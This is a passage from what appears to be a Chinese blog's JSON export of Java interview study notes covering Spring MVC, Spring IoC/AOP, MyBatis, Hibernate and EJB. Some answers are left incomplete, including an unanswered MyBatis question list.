当得到真正的视图对象后，DispatcherServlet会利用视图对象对模型数据进行渲染。⑧ 客户端得到响应，可能是一个普通的HTML页面，也可以是XML或JSON字符串，还可以是一张图片或者一个PDF文件。 简述一下SpringMVC的运行机制？以及运行机制的流程是什么？1、用户发送请求时会先从DispathcherServler的doService方法开始，在该方法中会将ApplicationContext、localeResolver、themeResolver等对象添加到request中，紧接着就是调用doDispatch方法。 2、进入该方法后首先会检查该请求是否是文件上传的请求(校验的规则是是否是post并且contenttType是否为multipart/为前缀)即调用的是checkMultipart方法；如果是的将request包装成MultipartHttpServletRequest。 3、然后调用getHandler方法来匹配每个HandlerMapping对象，如果匹配成功会返回这个Handle的处理链HandlerExecutionChain对象，在获取该对象的内部其实也获取我们自定定义的拦截器，并执行了其中的方法。 4、执行拦截器的preHandle方法，如果返回false执行afterCompletion方法并理解返回 5、通过上述获取到了HandlerExecutionChain对象，通过该对象的getHandler()方法获得一个object通过HandlerAdapter进行封装得到HandlerAdapter对象。 6、该对象调用handle方法来执行Controller中的方法，该对象如果返回一个ModelAndView给DispatcherServlet。 7、DispatcherServlet借助ViewResolver完成逻辑试图名到真实视图对象的解析，得到View后DispatcherServlet使用这个View对ModelAndView中的模型数据进行视图渲染。 说明一下springmvc和spring-boot区别是什么？总的来说，Spring 就像一个大家族，有众多衍生产品例如 Boot，Security，JPA等等。但他们的基础都是Spring 的 IOC 和 AOP，IOC提供了依赖注入的容器，而AOP解决了面向切面的编程，然后在此两者的基础上实现了其他衍生产品的高级功能；因为 Spring 的配置非常复杂，各种xml，properties处理起来比较繁琐。于是为了简化开发者的使用，Spring社区创造性地推出了Spring Boot，它遵循约定优于配置，极大降低了Spring使用门槛，但又不失Spring原本灵活强大的功能。 说明一下Spring MVC注解的优点是什么？1、XML配置起来有时候冗长，此时注解可能是更好的选择，如jpa的实体映射；注解在处理一些不变的元数据时有时候比XML方便的多，比如springmvc的数据绑定，如果用xml写的代码会多的多； 2、注解最大的好处就是简化了XML配置；其实大部分注解一定确定后很少会改变，所以在一些中小项目中使用注解反而提供了开发效率，所以没必要一头走到黑； 3、注解相对于XML的另一个好处是类型安全的，XML只能在运行期才能发现问题。 请简单介绍一下你了解的Java领域中的Web Service框架都有哪些？Java领域的Web Service框架很多，包括Axis2（Axis的升级版本）、Jersey（RESTful的Web Service框架）、CXF（XFire的延续版本）、Hessian、Turmeric、JBoss SOA等，其中绝大多数都是开源框架。 简述一下Mybatis和Hibernate的区别是什么？1、简介 Hibernate：Hibernate是当前最流行的ORM框架之一，对JDBC提供了较为完整的封装。Hibernate的O/R Mapping实现了POJO 和数据库表之间的映射，以及SQL的自动生成和执行。 Mybatis：Mybatis同样也是非常流行的ORM框架，主要着力点在于 POJO 与 SQL 之间的映射关系。然后通过映射配置文件，将SQL所需的参数，以及返回的结果字段映射到指定 POJO 。相对Hibernate“O/R”而言，Mybatis 是一种“Sql Mapping”的ORM实现。 2、缓存机制对比 相同点 Hibernate和Mybatis的二级缓存除了采用系统默认的缓存机制外，都可以通过实现你自己的缓存或为其他第三方缓存方案，创建适配器来完全覆盖缓存行为。 不同点 Hibernate的二级缓存配置在SessionFactory生成的配置文件中进行详细配置，然后再在具体的表-对象映射中配置是那种缓存。 MyBatis的二级缓存配置都是在每个具体的表-对象映射中进行详细配置，这样针对不同的表可以自定义不同的缓存机制。并且Mybatis可以在命名空间中共享相同的缓存配置和实例，通过Cache-ref来实现。 两者比较 因为Hibernate对查询对象有着良好的管理机制，用户无需关心SQL。所以在使用二级缓存时如果出现脏数据，系统会报出错误并提示。而MyBatis在这一方面，使用二级缓存时需要特别小心。如果不能完全确定数据更新操作的波及范围，避免Cache的盲目使用。否则，脏数据的出现会给系统的正常运行带来很大的隐患。 Mybatis：小巧、方便、高效、简单、直接、半自动化 Hibernate：强大、方便、高效、复杂、间接、全自动化 请问EJB需要直接实现它的业务接口或者Home接口吗？请简述一下理由。 在EJB中则至少要包括10个class:Bean类，特定App Server的Bean实现类Bean的remote接口，特定App Server的remote接口实现类，特定App Server的remote接口的实现类的stub类和skeleton类。Bean的home接口，特定App Server的home接口实现类，特定App Server的home接口的实现类的stub类和skeleton类。和RMI不同的是，EJB中这10个class真正需要用户写的只有3个，Bean类，remote接口，home接口，其它的7个究竟怎么生成，被打包在哪里，是否需要更多的类文件，否根据不同的App Server表现出较大的差异。Weblogic：home接口和remote接口的weblogic的实现类的stub类和skeleton类是在EJB被部署到weblogic的时候，由weblogic动态生成stub类和skeleton类的字节码，所以看不到这4个类文件。对于一次客户端远程调用EJB，要经过两个远程对象的多次RMI循环。首先是通过JNDI查找Home接口，获得Home接口的实现类，这个过程其实相当复杂，首先是找到Home接口的Weblogic实现类，然后创建一个Home接口的Weblogic实现类的stub类的对象实例，将它序列化传送给客户端（注意stub类的实例是在第1次RMI循环中，由服务器动态发送给客户端的，因此不需要客户端保存Home接口的Weblogic实现类的stub 类），最后客户端获得该stub类的对象实例（普通的RMI需要在客户端保存stub类，而EJB不需要，因为服务器会把stub类的对象实例发送给客户端）。客户端拿到服务器给它的Home接口的Weblogic实现类的stub类对象实例以后，调用stub类的create方法， (在代码上就是home.create()，但是后台要做很多事情),于是经过第2次RMI循环，在服务器端，Home接口的Weblogic实现类的 skeleton类收到stub类的调用信息后，由它再去调用Home接口的Weblogic实现类的create方法。在服务端， Home接口的Weblogic实现类的create方法再去调用Bean类的Weblogic实现类的ejbCreate方法，在服务端创建或者分配一个EJB实例，然后将这个EJB实例的远程接口的Weblogic实现类的stub类对象实例序列化发送给客户端。 说明一下EJB的几种类型分别是什么？会话（Session）Bean ，实体（Entity）Bean 消息驱动的（Message Driven）Bean，会话Bean又可分为有状态（Stateful）和无状态（Stateless）两种，实体Bean可分为Bean管理的持续性（BMP）和容器管理的持续性（CMP）两种。 简述一下EJB的激活机制是什么？以Stateful Session Bean 为例：其Cache大小决定了内存中可以同时存在的Bean实例的数量，根据MRU或NRU算法，实例在激活和去激活状态之间迁移，激活机制是当客户端调用某个EJB实例业务方法时，如果对应EJB Object发现自己没有绑定对应的Bean实例则从其去激活Bean存储中（通过序列化机制存储实例）回复（激活）此实例。状态变迁前会调用对应的 ejbActive和ejbPassivate方法。 说一下EJB规范中EJB禁止的操作有哪些？1.不能操作线程和线程API(线程API指非线程对象的方法如notify,wait等)， 2.不能操作awt， 3.不能实现服务器功能， 4.不能对静态属生存取， 5.不能使用IO操作直接存取文件系统， 6.不能加载本地库.， 7.不能将this作为变量和返回， 8.不能循环调用。 请简述一下EJB的角色以及对应的三个对象分别是什么？ 一个完整的基于EJB的分布式计算结构由六个角色组成，这六个角色可以由不同的开发商提供，每个角色所作的工作必须遵循Sun公司提供的EJB规范，以保证彼此之间的兼容性。这六个角色分别是EJB组件开发者（Enterprise Bean Provider） 、应用组合者（Application Assembler）、部署者（Deployer）、EJB 服务器提供者（EJB Server Provider）、EJB 容器提供者（EJB Container Provider）、系统管理员（System Administrator）三个对象是Remote（Local）接口、Home（LocalHome）接口，Bean类 EJB包括SessionBean和EntityBean，请说出他们的生命周期以及EJB是如何管理事务的？SessionBean： Stateless Session Bean 的生命周期是由容器决定的，当客户机发出请求要建立一个Bean的实例时，EJB容器不一定要创建一个新的Bean的实例供客户机调用，而是随便找一个现有的实例提供给客户机。当客户机第一次调用一个Stateful Session Bean 时，容器必须立即在服务器中创建一个新的Bean实例，并关联到客户机上，以后此客户机调用Stateful Session Bean 的方法时容器会把调用分派到与此客户机相关联的Bean实例。EntityBean：Entity Beans能存活相对较长的时间，并且状态是持续的。只要数据库中的数据存在，Entity beans就一直存活。而不是按照应用程序或者服务进程来说的。即使EJB容器崩溃了，Entity beans也是存活的。Entity Beans生命周期能够被容器或者Beans自己管理。EJB通过以下技术管理实务：对象管理组织（OMG）的对象实务服务（OTS），Sun Microsystems的Transaction Service（JTS）、Java Transaction API（JTA），开发组（X/Open）的XA接口。 EJB与JAVA BEAN的区别是什么？ Java Bean 是可复用的组件，对Java Bean并没有严格的规范，理论上讲，任何一个Java类都可以是一个Bean。但通常情况下，由于Java Bean是被容器所创建（如Tomcat）的，所以Java Bean应具有一个无参的构造器，另外，通常Java Bean还要实现Serializable接口用于实现Bean的持久性。Java Bean实际上相当于微软COM模型中的本地进程内COM组件，它是不能被跨进程访问的。EnterpriseJava Bean 相当于DCOM，即分布式组件。它是基于Java的远程方法调用（RMI）技术的，所以EJB可以被远程访问（跨进程、跨计算机）。但EJB必须被布署在诸如Webspere、WebLogic这样的容器中，EJB客户从不直接访问真正的EJB组件，而是通过其容器访问。EJB容器是EJB组件的代理， EJB组件由容器所创建和管理。客户通过容器来访问真正的EJB组件。 请问EJB是基于哪些技术实现的？并说明一下SessionBean和EntityBean的区别以及StatefulBean和StatelessBean的区别。EJB包括Session Bean、Entity Bean、Message Driven Bean，基于JNDI、RMI、JAT等技术实现。SessionBean在J2EE应用程序中被用来完成一些服务器端的业务操作，例如访问数据库、调用其他EJB组件。EntityBean被用来代表应用系统中用到的数据。对于客户机，SessionBean是一种非持久性对象，它实现某些在服务器上运行的业务逻辑。对于客户机，EntityBean是一种持久性对象，它代表一个存储在持久性存储器中的实体的对象视图，或是一个由现有企业应用程序实现的实体。Session Bean 还可以再细分为 Stateful Session Bean 与 Stateless Session Bean ，这两种的 Session Bean都可以将系统逻辑放在 method之中执行，不同的是 Stateful Session Bean 可以记录呼叫者的状态，因此通常来说，一个使用者会有一个相对应的Stateful Session Bean 的实体。Stateless Session Bean 虽然也是逻辑组件，但是他却不负责记录使用者状态，也就是说当使用者呼叫 Stateless Session Bean 的时候，EJB Container 并不会找寻特定的 Stateless Session Bean 的实体来执行这个 method。换言之，很可能数个使用者在执行某个 Stateless Session Bean 的 methods 时，会是同一个 Bean 的 Instance 在执行。从内存方面来看， Stateful Session Bean 与 Stateless Session Bean 比较， Stateful Session Bean 会消耗 J2EE Server 较多的内存，然而 Stateful Session Bean 的优势却在于他可以维持使用者的状态。","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Mybatis","slug":"Mybatis","date":"2020-07-13T21:41:49.000Z","updated":"2021-04-11T17:11:28.323Z","comments":true,"path":"mybatis/","link":"","permalink":"https://kayleh.top/mybatis/","excerpt":"MYBATIS","text":"MYBATIS 请问MyBatis中的动态SQL是什么意思？ 对于一些复杂的查询，我们可能会指定多个查询条件，但是这些条件可能存在也可能不存在，需要根据用户指定的条件动态生成SQL语句。如果不使用持久层框架我们可能需要自己拼装SQL语句，还好MyBatis提供了动态SQL的功能来解决这个问题。MyBatis中用于实现动态SQL的元素主要有：- if- choose / when / otherwise- trim- where- set- foreach 说明一下MyBatis中命名空间（namespace）的作用是什么？在大型项目中，可能存在大量的SQL语句，这时候为每个SQL语句起一个唯一的标识（ID）就变得并不容易了。为了解决这个问题，在MyBatis中，可以为每个映射文件起一个唯一的命名空间，这样定义在这个映射文件中的每个SQL语句就成了定义在这个命名空间中的一个ID。只要我们能够保证每个命名空间中这个ID是唯一的，即使在不同映射文件中的语句ID相同，也不会再产生冲突了。 1、mybatis对JDBC做了哪些封装？ 2、mybatis如何映射？ 3、Mybatis接口绑定有几种实现方式,分别是怎么实现的? 4、Mybatis中和${}的区别？ 5、myBatis 实现一对一有几种方式?具体怎么操作的？ 6、myBatis 实现一对多有几种方式?怎么操作的？ 7、myBatis 里面的动态Sql是怎么设定的?用什么语法? 8、讲下 myBatis 的缓存？ 9、mybatis的执行流程？ 10、持久层框架为什么选择mybatis？ 2😁. mapper.xml文件中的namespace(全限名)来关联和接口的关系. 3😁. .两种方式: ①通过注解绑定,在接口的方法上添加@select,@update,等注解,里面包含了sql语句.②通过xml文件里写sql绑定,这种方式要求指定xml文件里namespace的值为接口的全限定名.4😁.使用 ${}在编译期传入的参数会直接拼接成字符串,而则会生成占位符”?”,并且因为${}会直接拼接成字符串,会造成sql注入,而传入的参数会生成占位符”?” ,可以有效的防止了sql注入. 7😁.动态sql通过if节点来实现,使用OGNL语法判断.完整的动态sql要配合where,trim节点,choose,when,otherwise标签来完成,一个choose中至少有一个when,0个or1个otherwise,如果when满足就执行, 全部不满住就执行otherwise. 8😁.mybatis分一级缓存和二级缓存;一级缓存默认开启,在对象中有个hashmap用于存储缓存数据,不同的sqlsessioin之间缓存数据互不影响.二级缓存时mapper映射级别的缓存,多个SqlSession去操作同一个mapper映射的sql语句,多个SqlSession可以公用二级缓存,二级缓存是跨SqlSession的. (二级缓存需要手动开启),一级缓存和二级缓存都是用作在短时间内重复查询而做的优化. ! 我编不下去了.!🤣","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"Spring","slug":"Spring","date":"2020-07-13T21:40:15.000Z","updated":"2021-04-11T17:11:28.429Z","comments":true,"path":"spring/","link":"","permalink":"https://kayleh.top/spring/","excerpt":"SPRING","text":"SPRING Spring中自动装配的方式有哪些？- no：不进行自动装配，手动设置Bean的依赖关系。- byName：根据Bean的名字进行自动装配。- byType：根据Bean的类型进行自动装配。- constructor：类似于byType，不过是应用于构造器的参数，如果正好有一个Bean与构造器的参数类型相同则可以自动装配，否则会导致错误。- autodetect：如果有默认的构造器，则通过constructor的方式进行自动装配，否则使用byType的方式进行自动装配。 自动装配没有自定义装配方式那么精确，而且不能自动装配简单属性（基本类型、字符串等），在使用时应注意。 Spring中Bean的作用域有哪些？在Spring的早期版本中，仅有两个作用域：singleton和prototype，前者表示Bean以单例的方式存在；后者表示每次从容器中调用Bean时，都会返回一个新的实例，prototype通常翻译为原型。 设计模式中的创建型模式中也有一个原型模式，原型模式也是一个常用的模式，例如做一个室内设计软件，所有的素材都在工具箱中，而每次从工具箱中取出的都是素材对象的一个原型，可以通过对象克隆来实现原型模式。Spring 2.x中针对WebApplicationContext新增了3个作用域，分别是：request（每次HTTP请求都会创建一个新的Bean）、session（同一个HttpSession共享同一个Bean，不同的HttpSession使用不同的Bean）和globalSession（同一个全局Session共享一个Bean）。 单例模式和原型模式都是重要的设计模式。一般情况下，无状态或状态不可变的类适合使用单例模式。在传统开发中，由于DAO持有Connection这个非线程安全对象因而没有使用单例模式；但在Spring环境下，所有DAO类对可以采用单例模式，因为Spring利用AOP和Java API中的ThreadLocal对非线程安全的对象进行了特殊处理。 什么是IoC和DI？并且简要说明一下DI是如何实现的？IoC叫控制反转，是Inversion of Control的缩写，DI（Dependency Injection）叫依赖注入，是对IoC更简单的诠释。控制反转是把传统上由程序代码直接操控的对象的调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的”控制反转”就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建对象并管理对象之间的依赖关系。IoC体现了好莱坞原则 - “Don’t call me, we will call you”。依赖注入的基本原则是应用组件不应该负责查找资源或者其他依赖的协作对象。配置对象的工作应该由容器负责，查找资源的逻辑应该从应用组件的代码中抽取出来，交给容器来完成。DI是对IoC更准确的描述，即组件之间的依赖关系由容器在运行期决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。 一个类A需要用到接口B中的方法，那么就需要为类A和接口B建立关联或依赖关系，最原始的方法是在类A中创建一个接口B的实现类C的实例，但这种方法需要开发人员自行维护二者的依赖关系，也就是说当依赖关系发生变动的时候需要修改代码并重新构建整个系统。如果通过一个容器来管理这些对象以及对象的依赖关系，则只需要在类A中定义好用于关联接口B的方法（构造器或setter方法），将类A和接口B的实现类C放入容器中，通过对容器的配置来实现二者的关联。依赖注入可以通过setter方法注入（设值注入）、构造器注入和接口注入三种方式来实现，Spring支持setter注入和构造器注入，通常使用构造器注入来注入必须的依赖关系，对于可选的依赖关系，则setter注入是更好的选择，setter注入需要类提供无参构造器或者无参的静态工厂方法来创建对象。 Spring中BeanFactory和ApplicationContext的区别是什么？BeanFactoryBeanFactory是spring中比较原始，比较古老的Factory。因为比较古老，所以BeanFactory无法支持spring插件，例如：AOP、Web应用等功能。 ApplicationContextApplicationContext是BeanFactory的子类，因为古老的BeanFactory无法满足不断更新的spring的需求，于是ApplicationContext就基本上代替了BeanFactory的工作，以一种更面向框架的工作方式以及对上下文进行分层和实现继承，并在这个基础上对功能进行扩展： MessageSource, 提供国际化的消息访问 资源访问（如URL和文件） 事件传递 Bean的自动装配 各种不同应用层的Context实现 区别： 如果使用ApplicationContext，如果配置的bean是singleton，那么不管你有没有或想不想用它，它都会被实例化。好处是可以预先加载，坏处是浪费内存。 BeanFactory，当使用BeanFactory实例化对象时，配置的bean不会马上被实例化，而是等到你使用该bean的时候（getBean）才会被实例化。好处是节约内存，坏处是速度比较慢。多用于移动设备的开发。 没有特殊要求的情况下，应该使用ApplicationContext完成。因为BeanFactory能完成的事情，ApplicationContext都能完成，并且提供了更多接近现在开发的功能。 说明一下springIOC原理是什么？如果你要实现IOC需要怎么做？请简单描述一下实现步骤？①IoC（Inversion of Control，控制倒转）。这是spring的核心，贯穿始终。所谓IoC，对于spring框架来说，就是由spring来负责控制对象的生命周期和对象间的关系。 IoC的一个重点是在系统运行中，动态的向某个对象提供它所需要的其他对象。这一点是通过DI（Dependency Injection，依赖注入）来实现的。比如对象A需要操作数据库，以前我们总是要在A中自己编写代码来获得一个Connection对象，有了 spring我们就只需要告诉spring，A中需要一个Connection，至于这个Connection怎么构造，何时构造，A不需要知道。在系统运行时，spring会在适当的时候制造一个Connection，然后像打针一样，注射到A当中，这样就完成了对各个对象之间关系的控制。A需要依赖 Connection才能正常运行，而这个Connection是由spring注入到A中的，依赖注入的名字就这么来的。那么DI是如何实现的呢？ Java 1.3之后一个重要特征是反射（reflection），它允许程序在运行的时候动态的生成对象、执行对象的方法、改变对象的属性，spring就是通过反射来实现注入的。 举个简单的例子，我们找女朋友常见的情况是，我们到处去看哪里有长得漂亮身材又好的女孩子，然后打听她们的兴趣爱好、qq号、电话号、ip号、iq号………，想办法认识她们，投其所好送其所要，这个过程是复杂深奥的，我们必须自己设计和面对每个环节。传统的程序开发也是如此，在一个对象中，如果要使用另外的对象，就必须得到它（自己new一个，或者从JNDI中查询一个），使用完之后还要将对象销毁（比如Connection等），对象始终会和其他的接口或类藕合起来。 ②实现IOC的步骤 定义用来描述bean的配置的Java类 解析bean的配置，將bean的配置信息转换为上面的BeanDefinition对象保存在内存中，spring中采用HashMap进行对象存储，其中会用到一些xml解析技术 遍历存放BeanDefinition的HashMap对象，逐条取出BeanDefinition对象，获取bean的配置信息，利用Java的反射机制实例化对象，將实例化后的对象保存在另外一个Map中即可。 简单说明一下依赖注入的方式有哪几种？以及这些方法如何使用？ 1、Set注入 2、构造器注入 3、接口注入 @Controller和@RestController的区别是什么？ @RestController注解相当于@ResponseBody ＋ @Controller合在一起的作用 谈一下autowired 和resource区别是什么？1、共同点 两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。 2、不同点 （1）@Autowired @Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。 @Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。 （2）@Resource @Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。 介绍一下bean的生命周期Spring生命周期流程图： 简要说明一下IOC和AOP是什么？依赖注入的三种方式： （1）接口注入 （2）Construct注入 （3）Setter注入 控制反转（IoC）与依赖注入（DI）是同一个概念，引入IOC的目的： （1）脱开、降低类之间的耦合； （2）倡导面向接口编程、实施依赖倒换原则； （3）提高系统可插入、可测试、可修改等特性。 具体做法： （1）将bean之间的依赖关系尽可能地抓换为关联关系； （2）将对具体类的关联尽可能地转换为对Java interface的关联，而不是与具体的服务对象相关联； （3）Bean实例具体关联相关Java interface的哪个实现类的实例，在配置信息的元数据中描述； （4）由IoC组件（或称容器）根据配置信息，实例化具体bean类、将bean之间的依赖关系注入进来。 AOP（Aspect Oriented Programming），即面向切面编程，可以说是OOP（Object Oriented Programming，面向对象编程）的补充和完善。OOP引入封装、继承、多态等概念来建立一种对象层次结构，用于模拟公共行为的一个集合。不过OOP允许开发者定义纵向的关系，但并不适合定义横向的关系，例如日志功能。日志代码往往横向地散布在所有对象层次中，而与它对应的对象的核心功能毫无关系对于其他类型的代码，如安全性、异常处理和透明的持续性也都是如此，这种散布在各处的无关的代码被称为横切（cross cutting），在OOP设计中，它导致了大量代码的重复，而不利于各个模块的重用。 AOP技术恰恰相反，它利用一种称为”横切”的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为”Aspect”，即切面。所谓”切面”，简单说就是那些与业务无关，却为业务模块所共同调用的逻辑或责任封装起来，便于减少系统的重复代码，降低模块之间的耦合度，并有利于未来的可操作性和可维护性。 使用”横切”技术，AOP把软件系统分为两个部分：核心关注点和横切关注点。业务处理的主要流程是核心关注点，与之关系不大的部分是横切关注点。横切关注点的一个特点是，他们经常发生在核心关注点的多处，而各处基本相似，比如权限认证、日志、事物。AOP的作用在于分离系统中的各种关注点，将核心关注点和横切关注点分离开来。 Spring支持的事务管理类型有哪些？以及你在项目中会使用哪种方式？Spring支持编程式事务管理和声明式事务管理。许多Spring框架的用户选择声明式事务管理，因为这种方式和应用程序的关联较少，因此更加符合轻量级容器的概念。声明式事务管理要优于编程式事务管理，尽管在灵活性方面它弱于编程式事务管理，因为编程式事务允许你通过代码控制业务。 事务分为全局事务和局部事务。全局事务由应用服务器管理，需要底层服务器JTA支持（如WebLogic、WildFly等）。局部事务和底层采用的持久化方案有关，例如使用JDBC进行持久化时，需要使用Connetion对象来操作事务；而采用Hibernate进行持久化时，需要使用Session对象来操作事务。 这些事务的父接口都是PlatformTransactionManager。Spring的事务管理机制是一种典型的策略模式，PlatformTransactionManager代表事务管理接口，该接口定义了三个方法，该接口并不知道底层如何管理事务，但是它的实现类必须提供getTransaction()方法（开启事务）、commit()方法（提交事务）、rollback()方法（回滚事务）的多态实现，这样就可以用不同的实现类代表不同的事务管理策略。使用JTA全局事务策略时，需要底层应用服务器支持，而不同的应用服务器所提供的JTA全局事务可能存在细节上的差异，因此实际配置全局事务管理器是可能需要使用JtaTransactionManager的子类，如：WebLogicJtaTransactionManager（Oracle的WebLogic服务器提供）、UowJtaTransactionManager（IBM的WebSphere服务器提供）等。 如何理解AOP中的连接点（Joinpoint）、切点（Pointcut）、增强（Advice）、引介（Introduction）、织入（Weaving）、切面（Aspect）这些概念？a. 连接点（Joinpoint）：程序执行的某个特定位置（如：某个方法调用前、调用后，方法抛出异常后）。一个类或一段程序代码拥有一些具有边界性质的特定点，这些代码中的特定点就是连接点。Spring仅支持方法的连接点。b. 切点（Pointcut）：如果连接点相当于数据中的记录，那么切点相当于查询条件，一个切点可以匹配多个连接点。Spring AOP的规则解析引擎负责解析切点所设定的查询条件，找到对应的连接点。c. 增强（Advice）：增强是织入到目标类连接点上的一段程序代码。Spring提供的增强接口都是带方位名的，如：BeforeAdvice、AfterReturningAdvice、ThrowsAdvice等。 d. 引介（Introduction）：引介是一种特殊的增强，它为类添加一些属性和方法。这样，即使一个业务类原本没有实现某个接口，通过引介功能，可以动态的未该业务类添加接口的实现逻辑，让业务类成为这个接口的实现类。e. 织入（Weaving）：织入是将增强添加到目标类具体连接点上的过程，AOP有三种织入方式：①编译期织入：需要特殊的Java编译期（例如AspectJ的ajc）；②装载期织入：要求使用特殊的类加载器，在装载类的时候对类进行增强；③运行时织入：在运行时为目标类生成代理实现增强。Spring采用了动态代理的方式实现了运行时织入，而AspectJ采用了编译期织入和装载期织入的方式。f. 切面（Aspect）：切面是由切点和增强（引介）组成的，它包括了对横切关注功能的定义，也包括了对连接点的定义。 AOP的原理是什么？AOP（Aspect Orient Programming），指面向方面（切面）编程，作为面向对象的一种补充，用于处理系统中分布于各个模块的横切关注点，比如事务管理、日志、缓存等等。AOP实现的关键在于AOP框架自动创建的AOP代理，AOP代理主要分为静态代理和动态代理，静态代理的代表为AspectJ；而动态代理则以Spring AOP为代表。通常使用AspectJ的编译时增强实现AOP，AspectJ是静态代理的增强，所谓的静态代理就是AOP框架会在编译阶段生成AOP代理类，因此也称为编译时增强。 Spring AOP中的动态代理主要有两种方式，JDK动态代理和CGLIB动态代理。JDK动态代理通过反射来接收被代理的类，并且要求被代理的类必须实现一个接口。JDK动态代理的核心是InvocationHandler接口和Proxy类。 如果目标类没有实现接口，那么Spring AOP会选择使用CGLIB来动态代理目标类。CGLIB（Code Generation Library），是一个代码生成的类库，可以在运行时动态的生成某个类的子类，注意，CGLIB是通过继承的方式做的动态代理，因此如果某个类被标记为final，那么它是无法使用CGLIB做动态代理的。 aop的应用场景有哪些？Authentication 权限 ，Caching 缓存 ，Context passing 内容传递 ，Error handling 错误处理 ，Lazy loading 懒加载 ，Debugging 调试 ，logging, tracing, profiling and monitoring 记录跟踪 优化 校准，Performance optimization 性能优化 ，Persistence 持久化 ，Resource pooling 资源池 ，Synchronization 同步，Transactions 事务。 说明一下Spring框架为企业级开发带来的好处有哪些？- 非侵入式：支持基于POJO的编程模式，不强制性的要求实现Spring框架中的接口或继承Spring框架中的类。- IoC容器：IoC容器帮助应用程序管理对象以及对象之间的依赖关系，对象之间的依赖关系如果发生了改变只需要修改配置文件而不是修改代码，因为代码的修改可能意味着项目的重新构建和完整的回归测试。有了IoC容器，程序员再也不需要自己编写工厂、单例，这一点特别符合Spring的精神”不要重复的发明轮子”。- AOP（面向切面编程）：将所有的横切关注功能封装到切面（aspect）中，通过配置的方式将横切关注功能动态添加到目标代码上，进一步实现了业务逻辑和系统服务之间的分离。另一方面，有了AOP程序员可以省去很多自己写代理类的工作。- MVC：Spring的MVC框架为Web表示层提供了更好的解决方案。- 事务管理：Spring以宽广的胸怀接纳多种持久层技术，并且为其提供了声明式的事务管理，在不需要任何一行代码的情况下就能够完成事务管理。- 其他：选择Spring框架的原因还远不止于此，Spring为Java企业级开发提供了一站式选择，你可以在需要的时候使用它的部分和全部，更重要的是，甚至可以在感觉不到Spring存在的情况下，在你的项目中使用Spring提供的各种优秀的功能。 谈一下spring框架的优点都有哪些？Spring是一个轻量级的DI和AOP容器框架，在项目的中的使用越来越广泛，它的优点主要有以下几点： Spring是一个非侵入式框架，其目标是使应用程序代码对框架的依赖最小化，应用代码可以在没有Spring或者其他容器的情况运行。 Spring提供了一个一致的编程模型，使应用直接使用POJO开发，从而可以使运行环境隔离开来。 Spring推动应用的设计风格向面向对象及面向接口编程转变，提高了代码的重用性和可测试性。 Spring改进了结构体系的选择，虽然作为应用平台，Spring可以帮助我们选择不同的技术实现，比如从Hibernate切换到其他的ORM工具，从Struts切换到Spring MVC,尽管我们通常不会这么做，但是我们在技术方案上选择使用Spring作为应用平台，Spring至少为我们提供了这种可能性的选择，从而降低了平台锁定风险。 Struts拦截器和Spring AOP有什么区别？拦截器是AOP的一种实现，struts2 拦截器采用xwork2的interceptor！而spring的AOP基于IoC基础,其底层采用动态代理与CGLIB代理两种方式结合的实现方式。 简单介绍一下spring？Spring是一个轻量级框架，可以一站式构建你的企业级应用。 Spring的模块大概分为6个。分别是： 1、Core Container（Spring的核心）【重要】 2、AOP（面向切面变成）【重要】 3、Messaging（消息发送的支持） 4、Data Access/Integration（数据访问和集成） 5、Web（主要是SpringWeb内容，包括MVC）【重要】 6、Test（Spring测试支持，包含JUint等测试单元的支持） 7、Instrumentation（设备支持，比如Tomcat的支持） 请问持久层设计要考虑的问题有哪些？请谈一下你用过的持久层框架都有哪些？所谓”持久”就是将数据保存到可掉电式存储设备中以便今后使用，简单的说，就是将内存中的数据保存到关系型数据库、文件系统、消息队列等提供持久化支持的设备中。持久层就是系统中专注于实现数据持久化的相对独立的层面。 持久层设计的目标包括：- 数据存储逻辑的分离，提供抽象化的数据访问接口。- 数据访问底层实现的分离，可以在不修改代码的情况下切换底层实现。- 资源管理和调度的分离，在数据访问层实现统一的资源调度（如缓存机制）。- 数据抽象，提供更面向对象的数据操作。 持久层框架有：- Hibernate- MyBatis- TopLink- Guzz- jOOQ- Spring Data- ActiveJDBC","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://kayleh.top/tags/Interview/"}]},{"title":"IO","slug":"IO","date":"2020-07-13T21:39:13.000Z","updated":"2021-04-25T13:53:05.309Z","comments":true,"path":"io-Interview/","link":"","permalink":"https://kayleh.top/io-Interview/","excerpt":"IO","text":"IO 运行时异常与受检异常有什么区别？ 异常表示程序运行过程中可能出现的非正常状态，运行时异常表示虚拟机的通常操作中可能遇到的异常，是一种常见运行错误，只要程序设计得没有问题通常就不会发生。受检异常跟程序运行的上下文环境有关，即使程序设计无误，仍然可能因使用的问题而引发。Java编译器要求方法必须声明抛出可能发生的受检异常，但是并不要求必须声明抛出未被捕获的运行时异常。异常和继承一样，是面向对象程序设计中经常被滥用的东西，在Effective Java中对异常的使用给出了以下指导原则： - 不要将异常处理用于正常的控制流（设计良好的API不应该强迫它的调用者为了正常的控制流而使用异常）- 对可以恢复的情况使用受检异常，对编程错误使用运行时异常- 避免不必要的使用受检异常（可以通过一些状态检测手段来避免异常的发生）- 优先使用标准的异常- 每个方法抛出的异常都要有文档- 保持异常的原子性- 不要在catch中忽略掉捕获到的异常 什么是java序列化？以及如何实现java序列化？序列化就是一种用来处理对象流的机制，所谓对象流也就是将对象的内容进行流化。可以对流化后的对象进行读写操作，也可将流化后的对象传输于网络之间。序列化是为了解决在对对象流进行读写操作时所引发的问题。序列化的实现：将需要被序列化的类实现Serializable接口，该接口没有需要实现的方法，implements 